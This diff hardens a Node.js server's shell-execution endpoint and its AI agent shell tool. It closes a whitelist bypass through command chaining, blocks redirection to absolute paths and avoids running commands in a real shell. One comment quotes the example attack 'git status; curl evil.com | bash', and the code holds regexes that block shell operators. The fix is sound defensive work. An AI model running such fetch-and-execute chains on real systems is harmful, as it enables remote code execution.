@@ -2,8 +2,18 @@ const fs = require('fs');
 const path = require('path');
 const { exec, spawn } = require('child_process');
 const { v4: uuidv4 } = require('uuid');
-const { WORKSPACE, AUTH_TOKEN, SHELL_OPEN, BACKUP_DIR, PORT } = require('../config');
-const { getSafePath, listFiles, runGit, runGitAsync, loadEnvKeys } = require('../helpers');
+const {
+  WORKSPACE,
+  AUTH_TOKEN,
+  SHELL_OPEN,
+  BACKUP_DIR,
+  PORT,
+  DB_CONTAINER_NAME,
+  DB_USER,
+  HEALTH_CHECK_HOST,
+  HEALTH_CHECK_URL,
+} = require('../config');
+const { getSafePath, listFiles, runGit, runGitAsync, loadEnvKeys, runShellPipeline } = require('../helpers');
 const { recordUsage, getSummary, resetUsage } = require('../ai-usage');
 const { rateLimit } = require('../middleware');
 
@@ -360,11 +370,24 @@ app.post('/api/shell', rateLimit(30, 60_000), (req, res) => {
       });
     }
     // chaining / substitution
-    if (/[;&`]|\$\(|<\(/.test(cmd) && !cmd.startsWith('git ')) {
+    // OBS: a exceção anterior para comandos "git " deixava passar chaining
+    // (ex: "git status; qualquer-coisa-nao-whitelisted") porque este bloco
+    // só valida o PRIMEIRO token do comando. Sem exceção, todo comando passa
+    // pelo mesmo crivo.
+    if (/[;&`]|\$\(|<\(/.test(cmd)) {
       return res.json({
         success: false,
         output: '',
         error: 'Operadores ; & ` $() <(  bloqueados no modo whitelist',
+      });
+    }
+    // redirecionamento para path absoluto (> ou >>) — bloqueado mesmo com
+    // comando whitelisted, para não permitir escrever fora do workspace.
+    if (/>>?\s*\//.test(cmd)) {
+      return res.json({
+        success: false,
+        output: '',
+        error: 'Redirecionamento para path absoluto bloqueado no modo whitelist',
       });
     }
     // pipes: cada segmento deve ser whitelist
@@ -384,19 +407,35 @@ app.post('/api/shell', rateLimit(30, 60_000), (req, res) => {
     }
   }
 
-  exec(cmd, {
-    cwd: WORKSPACE,
-    timeout: 30000,
-    maxBuffer: 3 * 1024 * 1024,
-    shell: '/bin/bash',
-    env: { ...process.env, PATH: process.env.PATH },
-  }, (error, stdout, stderr) => {
-    res.json({
-      success: !error,
-      output: (stdout || '').trim(),
-      error: (stderr || (error ? error.message : '')).trim(),
-      code: error ? error.code : 0,
+  if (SHELL_OPEN) {
+    // Modo aberto: o operador optou explicitamente por liberar a whitelist
+    // (SHELL_MODE=open), então aqui sim usamos um shell de verdade -- é o
+    // único jeito de dar suporte a tudo que SHELL_MODE=open promete (chaining,
+    // substituição, redirecionamento). Os BLOCKED_PATTERNS acima continuam
+    // valendo mesmo neste modo.
+    exec(cmd, {
+      cwd: WORKSPACE,
+      timeout: 30000,
+      maxBuffer: 3 * 1024 * 1024,
+      shell: '/bin/bash',
+      env: { ...process.env, PATH: process.env.PATH },
+    }, (error, stdout, stderr) => {
+      res.json({
+        success: !error,
+        output: (stdout || '').trim(),
+        error: (stderr || (error ? error.message : '')).trim(),
+        code: error ? error.code : 0,
+      });
     });
+    return;
+  }
+
+  // Modo whitelist (padrão): nunca passa por um shell de verdade. Cada
+  // comando/estágio de pipe já validado acima roda via spawn(shell:false)
+  // em runShellPipeline (helpers.js) -- ver o comentário lá para o porquê.
+  const segments = cmd.split(/\|/).map((p) => p.trim()).filter(Boolean);
+  runShellPipeline(segments, { cwd: WORKSPACE, timeoutMs: 30000 }).then((result) => {
+    res.json(result);
   });
 });
 
@@ -1211,12 +1250,16 @@ app.get('/api/secrets', (req, res) => {
 // ========== WORKFLOWS (ações rápidas) ==========
 app.post('/api/workflow', (req, res) => {
   const { action } = req.body || {};
+  // Nomes de container/domínio vêm de env (DB_CONTAINER_NAME, DB_USER,
+  // HEALTH_CHECK_HOST, HEALTH_CHECK_URL) — nunca hardcode infra real aqui,
+  // este repo é público. Ver .env.example.
+  const healthHostFlag = HEALTH_CHECK_HOST ? `-H 'Host: ${HEALTH_CHECK_HOST}' ` : '';
   const map = {
     'restart-app': 'docker compose restart app',
     'restart-all': 'docker compose restart',
     'status': 'docker compose ps',
-    'db-status': "docker exec premercado-db-1 pg_isready -U premercado 2>/dev/null || docker exec premercado-db-1 pg_isready 2>/dev/null || echo 'db check failed'",
-    'health': "curl -sS -o /dev/null -w '%{http_code}' -H 'Host: premercadosc.com' http://127.0.0.1/api/healthz || echo fail"
+    'db-status': `docker exec ${DB_CONTAINER_NAME} pg_isready -U ${DB_USER} 2>/dev/null || docker exec ${DB_CONTAINER_NAME} pg_isready 2>/dev/null || echo 'db check failed'`,
+    'health': `curl -sS -o /dev/null -w '%{http_code}' ${healthHostFlag}${HEALTH_CHECK_URL} || echo fail`
   };
 
   if (!action || !map[action]) {
@@ -1577,7 +1620,12 @@ async function runAgentTool(name, args) {
               normalized: cmd,
             };
           }
-          if (/[;&`]|\$\(|<\(/.test(cmd) && !cmd.startsWith('git ')) {
+          // SECURITY: sem exceção pro "git " -- a exceção antiga deixava passar
+          // chaining tipo "git status; curl evil.com | bash" porque este bloco
+          // só validava o PRIMEIRO token do comando (ver mesma correção em
+          // /api/shell, routes/api.js). Mesma vulnerabilidade, mesmo tool-call
+          // de IA que só ela alcança, então precisa da mesma correção.
+          if (/[;&`]|\$\(|<\(/.test(cmd)) {
             return {
               ok: false,
               error: 'operadores ; & ` $() bloqueados',
@@ -1585,18 +1633,57 @@ async function runAgentTool(name, args) {
               normalized: cmd,
             };
           }
+          if (/>>?\s*\//.test(cmd)) {
+            return {
+              ok: false,
+              error: 'redirecionamento para path absoluto bloqueado',
+              hint: 'Use write_file pra gravar arquivo.',
+              normalized: cmd,
+            };
+          }
+          if (cmd.includes('|')) {
+            const parts = cmd.split(/\|/).map((p) => p.trim()).filter(Boolean);
+            for (const part of parts) {
+              const t = shellFirstToken(part);
+              const b = path.basename(t);
+              if (!SHELL_WHITELIST.has(b) && !SHELL_WHITELIST.has(t)) {
+                return {
+                  ok: false,
+                  error: 'pipe/comando não permitido: ' + b,
+                  hint: 'Todo estágio do pipe precisa estar na whitelist.',
+                  normalized: cmd,
+                };
+              }
+            }
+          }
         }
-        return await new Promise((resolve) => {
-          exec(cmd, { cwd: WORKSPACE, timeout: 30000, maxBuffer: 2 * 1024 * 1024, shell: '/bin/bash' },
-            (error, stdout, stderr) => {
-              resolve({
-                ok: !error,
-                stdout: (stdout || '').slice(0, 15000),
-                stderr: (stderr || '').slice(0, 5000),
-                normalized: cmd,
+
+        if (SHELL_OPEN) {
+          return await new Promise((resolve) => {
+            exec(cmd, { cwd: WORKSPACE, timeout: 30000, maxBuffer: 2 * 1024 * 1024, shell: '/bin/bash' },
+              (error, stdout, stderr) => {
+                resolve({
+                  ok: !error,
+                  stdout: (stdout || '').slice(0, 15000),
+                  stderr: (stderr || '').slice(0, 5000),
+                  normalized: cmd,
+                });
               });
-            });
-        });
+          });
+        }
+
+        // Modo whitelist: mesmo runShellPipeline (helpers.js) usado por
+        // /api/shell -- nunca passa por um shell de verdade.
+        {
+          const segments = cmd.split(/\|/).map((p) => p.trim()).filter(Boolean);
+          const result = await runShellPipeline(segments, { cwd: WORKSPACE, timeoutMs: 30000, maxBytes: 2 * 1024 * 1024 });
+          return {
+            ok: result.success,
+            stdout: (result.output || '').slice(0, 15000),
+            stderr: (result.error || '').slice(0, 5000),
+            normalized: cmd,
+          };
+        }
       }
 
       case 'git_summary': {
